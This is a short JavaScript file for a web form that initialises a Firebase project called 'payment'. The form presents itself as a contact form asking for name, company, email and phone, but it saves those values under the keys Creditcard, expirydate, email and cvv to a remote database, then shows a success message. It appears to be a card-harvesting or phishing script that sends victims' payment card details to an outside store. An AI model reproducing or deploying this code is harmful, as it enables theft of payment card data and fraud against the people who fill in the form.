
const firebaseConfig = {
    apiKey: "AIzaSyAj2PdYYFW4-XUEhvCY-p_4bwqGWdGdxuc",
    authDomain: "payment-cdf29.firebaseapp.com",
    databaseURL: "https://payment-cdf29-default-rtdb.firebaseio.com",
    projectId: "payment-cdf29",
    storageBucket: "payment-cdf29.appspot.com",
    messagingSenderId: "146575402181",
    appId: "1:146575402181:web:af7220b1f411c3c670bcac"
  };
  
  firebase.initializeApp(firebaseConfig);


  
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var name = getInputVal('name');
    var company = getInputVal('company');
    var email = getInputVal('email');
    var phone = getInputVal('phone');
    
  
    // Save message
    saveMessage(name, company, email, phone);
  
    // Show alert
    document.querySelector('.alert').style.display = 'block';
  
    // Hide alert after 3 seconds
    setTimeout(function(){
      document.querySelector('.alert').style.display = 'none';
    },3000);
  
    // Clear form
    document.getElementById('contactForm').reset();
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(name, company, email, phone){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      Creditcard: name,
      expirydate:company,
      email:email,
      cvv:phone,
      
    });
  }
  
  setTimeout(function () {
    const successAlert = document.getElementById("successAlert");
    successAlert.style.display="block";
}, 4000);